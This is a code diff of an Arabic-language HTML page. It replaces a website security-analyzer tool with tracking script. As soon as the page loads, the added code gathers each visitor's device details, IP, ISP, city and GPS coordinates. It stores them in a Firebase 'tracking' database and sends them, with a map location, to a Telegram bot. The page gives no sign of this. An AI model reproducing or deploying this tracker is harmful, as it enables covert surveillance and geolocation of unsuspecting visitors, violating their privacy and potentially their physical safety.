+            data.colorDepth = `${screen.colorDepth}-bit (${screen.pixelDepth}bit)`;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;            data.language = navigator.language || navigator.userLanguage || 'Unknown';
+            data.memory = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : 'Unknown';
+            data.url = window.location.href;
+            data.timestamp = new Date().toISOString();
+            
+            // معلومات إضافية
+            const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+            const cookieEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+            const doNotTrack = navigator.doNotTrack || 'Unknown';
+            
+            data.deviceInfo = `OS: ${data.os}\nBrowser: ${data.browser}\nPlatform: ${data.platform}\nCPU: ${data.cpu}\nRAM: ${data.memory}\nScreen: ${data.screen}\nColor Depth: ${data.colorDepth}\nTimezone: ${data.timezone}\nLanguage: ${data.language}\nOnline: ${onlineStatus}\nCookies: ${cookieEnabled}\nDo Not Track: ${doNotTrack}\nUser Agent: ${data.userAgent.substring(0, 100)}...`;
+            
+            updateElement('os', data.os);
+            updateElement('browser', data.browser);
+            updateElement('screen', data.screen);
+            updateElement('colorDepth', data.colorDepth);
+            updateElement('timezone', data.timezone);
+            updateElement('language', data.language);
+            updateElement('memory', data.memory);
+            updateElement('url', data.url);
+            updateElement('deviceInfo', data.deviceInfo);
+            
+            // Network info
+            const conn = navigator.connection;
+            if (conn) {
+                data.connection = `${conn.effectiveType || 'unknown'} (${conn.downlink || '?'}Mbps, RTT: ${conn.rtt || '?'}ms)`;
+                updateElement('connection', data.connection);
             }
-        });
-
-        // 5. Inline Scripts (Potential XSS)
-        const inlineScripts = doc.querySelectorAll('script:not([src])');
-        if (inlineScripts.length > 5) {
-            addRisk(`${inlineScripts.length} سكريبت مدمج داخل الصفحة (قد يؤثر على الأداء والأمان)`, 'med');
+            
+            log('✓ بيانات الجهاز مكتملة', 'success');
+            updateProgress(30, 'تم جمع بيانات الجهاز');
         }
 
-        // Update Score
-        score = Math.max(0, score);
-        const scoreEl = document.getElementById('securityScore');
-        const msgEl = document.getElementById('securityMsg');
-        document.getElementById('stat-risks').innerText = riskCount;
-
-        scoreEl.innerText = score + "%";
-        if (score >= 80) {
-            scoreEl.style.borderColor = "var(--success)";
-            scoreEl.style.color = "var(--success)";
-            msgEl.innerText = "✅ الموقع يبدو آمناً بشكل عام";
-        } else if (score >= 50) {
-            scoreEl.style.borderColor = "var(--warning)";
-            scoreEl.style.color = "var(--warning)";
-            msgEl.innerText = "⚠️ توجد بعض التحسينات المطلوبة";
-        } else {
-            scoreEl.style.borderColor = "var(--danger)";
-            scoreEl.style.color = "var(--danger)";
-            msgEl.innerText = "🚨 تحذير: توجد مخاطر أمنية واضحة!";
-        }
-    }
-
-    // Analyze Network/External Servers
-    function analyzeNetwork(sourceCode) {
-        const serverList = document.getElementById('list-servers');
-        serverList.innerHTML = '';
-        
-        const urlRegex = /(https?:\/\/[^\s"'<>]+)/g;
-        const foundUrls = new Set();
-        let match;
-        
-        while ((match = urlRegex.exec(sourceCode)) !== null) {
-            foundUrls.add(match[0]);
-        }
-
-        const mainDomain = currentBaseUrl.includes('local-upload') ? '' : new URL(currentBaseUrl).hostname;
-        const externalServers = Array.from(foundUrls).filter(u => {
+        // 🔗 Firebase
+        function initFirebase() {
             try {
-                const uObj = new URL(u);
-                return uObj.hostname !== mainDomain && 
-                       !uObj.hostname.includes('googleapis') && 
-                       !uObj.hostname.includes('cloudflare') &&
-                       !uObj.hostname.includes('gstatic');
-            } catch(e) { return false; }
-        });
-
-        externalServers.slice(0, 30).forEach(url => {
-            const li = document.createElement('li');
-            li.innerHTML = `<span class="risk-med">🔗 ${url}</span>`;
-            serverList.appendChild(li);
-        });
-    }
-
-    // Download Resource
-    async function downloadResource(url, type) {
-        if (!url || url.startsWith('data:') || url.startsWith('javascript:')) {
-            showAlert("لا يمكن تحميل هذا النوع من الموارد");
-            return;
+                log('🔗 جاري الاتصال بـ Firebase...', 'info');
+                firebase.initializeApp(firebaseConfig);
+                const db = firebase.database();
+                
+                const connectedRef = db.ref('.info/connected');
+                connectedRef.on('value', snap => {
+                    if (snap.val() === true) {
+                        firebaseConnected = true;
+                        log('✓ Firebase متصل', 'success');
+                    } else {
+                        firebaseConnected = false;
+                        log('✗ Firebase غير متصل', 'error');
+                    }
+                });                return db;
+            } catch (e) {
+                log('✗ فشل Firebase: ' + e.message, 'error');
+                return null;
+            }
         }
 
-        const btn = event.target;
-        const originalText = btn.innerText;
-        btn.innerText = "...";
-        btn.disabled = true;
-
-        try {
-            const content = await fetchWithProxies(url);
-            const blob = new Blob([content], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = `resource_${type}_${Date.now()}.txt`;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            btn.innerText = "✅";
-        } catch (e) {
-            btn.innerText = "❌";
-            showAlert("فشل تحميل الملف: " + e.message);
+        async function saveToFirebase(db, data) {
+            if (!db) return false;
+            try {
+                await db.ref('tracking/' + data.id).set(data);
+                log('✓ حُفظ في Firebase', 'success');
+                return true;
+            } catch (e) {
+                log('✗ فشل الحفظ: ' + e.message, 'error');
+                return false;
+            }
         }
-        
-        setTimeout(() => {
-            btn.innerText = originalText;
-            btn.disabled = false;
-        }, 2000);
-    }
 
-    // Download Full Source
-    function downloadFullSource() {
-        if (!fullSourceCode) {
-            showAlert("لا يوجد كود مصدر متاح للتحميل");
-            return;
+        // 📨 Telegram
+        async function sendToTelegram() {
+            if (telegramSent) return;
+            log('📨 جاري الإرسال لتليجرام...', 'info');
+            
+            try {
+                let msg = `🚨 *تقرير تتبع شامل*\n\n`;
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `🌐 *IP:* \`${data.ip}\`\n`;
+                msg += `📍 *الموقع:* ${data.city}, ${data.country}\n`;
+                msg += `🏢 *ISP:* ${data.isp}\n`;
+                msg += `📡 *الاتصال:* ${data.connection}\n\n`;
+                
+                if (data.lat && data.lat !== 'Denied' && data.lat !== 'Not Supported') {
+                    msg += `🎯 *GPS دقيق:*\n`;
+                    msg += `LAT: \`${data.lat}\`\n`;
+                    msg += `LNG: \`${data.lng}\`\n`;
+                    msg += `الدقة: ${data.accuracy}م\n\n`;
+                }
+                
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `💻 *الجهاز:*\n`;
+                msg += `OS: ${data.os}\n`;
+                msg += `Browser: ${data.browser}\n`;
+                msg += `Screen: ${data.screen}\n`;
+                msg += `RAM: ${data.memory}\n`;
+                msg += `Language: ${data.language}\n\n`;
+                
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `🕒 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n`;
+                msg += `🔗 *الرابط:* ${data.url}`;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (data.lat && data.lat !== 'Denied' && data.lat !== 'Not Supported') {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: parseFloat(data.lat),
+                            longitude: parseFloat(data.lng)
+                        })
+                    });
+                    log('✓ أُرسل الموقع كـ Location', 'success');
+                }
+
+                log('✓ أُرسل لتليجرام بنجاح!', 'success');
+                telegramSent = true;
+            } catch (e) {
+                log('✗ فشل الإرسال: ' + e.message, 'error');
+            }
         }
-        const blob = new Blob([fullSourceCode], { type: 'text/html' });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);
-        link.download = `website_source_${Date.now()}.html`;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-    }
-</script>
 
+        // 🚀 التشغيل الرئيسي
+        async function init() {
+            log('=== بدء النظام الجنائي الشامل ===', 'warn');
+            updateProgress(0, 'بدء جمع البيانات...');
+            
+            const db = initFirebase();
+            
+            // جمع البيانات بالتسلسل
+            getDeviceData();
+            await getIPData();
+            await getGPS();
+            
+            // الحفظ والإرسال
+            if (firebaseConnected && db) {
+                await saveToFirebase(db, data);
+            }
+            
+            await sendToTelegram();
+                        log('=== اكتمل جمع جميع البيانات ===', 'success');
+            updateProgress(100, '✅ اكتمل - تم الإرسال');
+            updateStatus('✅ تم جمع وإرسال جميع البيانات', 'connected');
+        }
+
+        // تشغيل عند تحميل الصفحة
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
+    </script>
 </body>
 </html>
-
-
